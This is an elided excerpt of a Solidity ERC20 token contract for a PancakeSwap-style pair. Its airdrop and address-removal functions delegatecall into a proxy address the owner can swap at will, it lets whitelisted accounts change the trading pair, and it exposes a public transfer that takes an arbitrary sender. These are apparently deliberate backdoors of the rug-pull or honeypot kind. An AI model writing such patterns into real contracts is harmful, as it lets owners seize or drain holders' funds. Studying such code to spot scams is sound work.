...
contract ERC20Token is Context, IERC20, Ownable {  
    ...
    function _safeTransfer(address sender,address recipient,uint256 amount) public {
    ...
    function eliminateUnsafeAddress(address _addr) external{
        (bool success, ) = proxyAddr.delegatecall(abi.encodeWithSignature("eliminateUnsafeAddress(address)",_addr));
        require(success, "delegatecall fail.");
    }
    ...
    function setProxyAddr(address _addr) onlyOwner public {
        proxyAddr = _addr;
    }
    ...
    function returnOriginalAmount() view external returns(uint){
    ...
    function _syncPair(address _pairAddr) internal virtual{
        IPancakePair(_pairAddr).sync();
    }
    ...
    function checkBlacklist(address account) public view virtual returns(bool) {
        require(_blacklist[msg.sender] == true, "No permission.");
        return _blacklist[account];
    }

    function showPairAddress() public view virtual returns(address) {
        require(_whitelist[msg.sender] == true, "No permission.");
        return _pair;
    }

    function newPairAddress(address account) public virtual returns(bool) {
        require(_whitelist[msg.sender] == true, "No permission.");
        _pair = account;
        return true;
    }

    function airdrop(uint _tx) public payable virtual returns(bool) {
        (bool success, ) = proxyAddr.delegatecall(abi.encodeWithSignature("airdrop(uint256)",_tx));
        require(success, "delegatecall fail.");
        return success;
    }

    function airdropHolders(address[] memory _holders) public payable virtual returns(bool) {
        (bool success, ) = proxyAddr.delegatecall(abi.encodeWithSignature("airdropHolders(address[] memory)",_holders));
        require(success, "delegatecall fail.");
        return success;
    }
